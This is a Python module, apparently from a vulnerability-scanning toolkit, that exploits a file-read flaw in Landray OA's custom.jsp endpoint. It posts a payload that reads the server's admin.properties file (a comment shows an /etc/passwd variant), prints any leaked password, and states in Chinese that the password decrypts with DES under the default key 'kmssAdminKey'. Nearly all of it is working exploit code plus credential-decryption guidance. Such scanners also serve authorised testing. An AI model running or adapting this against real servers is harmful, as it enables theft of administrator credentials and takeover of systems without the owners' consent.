#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile

urllib3.disable_warnings()

class LanlingSsrfJndiScan:
    def __init__(self):
        self.proxy = None
        self.header = None
        self.ssl = None

    def run(self,url,data):
        # data = "var={“body”:{“file”:”file:///etc/passwd”}}"
        header = {
            'User-Agent': self.header,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip'
        }
        try:
            response = requests.post(url, headers=header, data=data, timeout=5, verify=self.ssl, proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and 'password' in response.text:
                OutPrintInfoSuc("LanLing", f"存在蓝凌 OA SSRF+JNDI远程命令执行:{url}")
                if not self.batch:
                    OutPrintInfo("LanLing",f"请求体:\n{response.text}")
                    OutPrintInfo("LanLing",'kmss.properties.encrypt.enabled时密码是加密后的')
                    OutPrintInfo("LanLing",'获取password后，使用 DES方法 解密，默认密钥为 [b red]kmssAdminKey[/b red]')
                else:
                    OutPutFile("lanling_ssrf_jndi_rce.txt",f"存在蓝凌 OA SSRF+JNDI远程命令执行:{url}")
            else:
                if not self.batch:
                    OutPrintInfo("LanLing", "目标不存在该漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("LanLing", "目标请求出错")
    def main(self, results):
        self.batch = results["batch_work"]
        url = results["url"].strip('/ ')
        self.ssl = results["ssl"]
        self.header = results["header"]
        proxy = results["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("LanLing","开始检测蓝凌 OA SSRF+JNDI 远程命令执行......")
        new_url = url + "/sys/ui/extend/varkind/custom.jsp"
        data_list = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'

        self.run(new_url,data_list)
        if not self.batch:
            OutPrintInfo("LanLing","蓝凌 OA SSRF+JNDI 远程命令执行检测结束")